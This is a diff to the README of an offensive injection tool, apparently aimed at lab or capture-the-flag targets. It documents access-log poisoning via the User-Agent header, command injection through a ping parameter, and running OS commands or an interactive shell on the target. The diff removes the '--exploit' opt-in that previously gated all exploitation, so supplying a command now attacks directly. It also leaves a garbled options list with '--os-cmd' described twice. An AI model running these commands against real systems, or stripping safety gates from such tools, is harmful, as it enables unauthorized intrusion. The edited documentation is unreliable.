@@ -346,7 +346,7 @@ A plain path is all that survives, and a plain path is what the access log is.
 Point `--log-path` at it, and the code goes into the file the server writes for
 itself - through the `User-Agent`, which both nginx and apache record as sent:
 
-    python injectorkit.py proto -u "https://target/" --forms --exploit \
+    python injectorkit.py proto -u "https://target/" --forms \
         --log-path /var/log/nginx/access.log --os-cmd 'cat /var/www/html/flag.php'
 
 The path differs by server; `/var/log/apache2/access.log` is the other common
@@ -378,7 +378,7 @@ not enough to serve a gadget.
 
     python injectorkit.py cmdi -u "http://target/ping?host=127.0.0.1"
     python injectorkit.py cmdi -u "http://target/" --data "host=127.0.0.1" --param host
-    python injectorkit.py cmdi -u "http://target/ping?host=x" --exploit --os-cmd 'id'
+    python injectorkit.py cmdi -u "http://target/ping?host=x" --os-cmd 'id'
 
 A parameter that reaches a shell is a question, not a payload list. The tool asks
 the target to print two markers it has just invented with a computed number
@@ -416,7 +416,8 @@ Options that matter:
 
     --param NAME       which parameter to attack (default: pick the likely ones)
     --max-params N     how many of them to try
-    --exploit          turns on the exploitation step; nothing runs without it
+    --os-cmd           run this command once execution is established; naming it
+                   is the request, so nothing else is needed
     --os-cmd COMMAND   the command to run through the shape that was proved
     --dry-run          resolve everything, send nothing
 
@@ -447,9 +448,9 @@ tried; nothing was learned about the filter, so nothing is rewarded.
 `--os-cmd` runs one command through the delivery that was proved. `--os-shell`
 keeps the injection open and runs what you type, from a terminal or from a pipe:
 
-    python injectorkit.py cmdi -u "http://target/ping?host=x" --exploit --os-cmd 'id'
-    python injectorkit.py cmdi -u "http://target/ping?host=x" --exploit --os-shell
-    printf 'id\nuname -a\nexit\n' | python injectorkit.py cmdi -u ... --exploit --os-shell
+    python injectorkit.py cmdi -u "http://target/ping?host=x" --os-cmd 'id'
+    python injectorkit.py cmdi -u "http://target/ping?host=x" --os-shell
+    printf 'id\nuname -a\nexit\n' | python injectorkit.py cmdi -u ... --os-shell
 
 A marker goes out on either side of the command, in the same request, and the
 response is only shown if both come back in it. A separate self-check does not
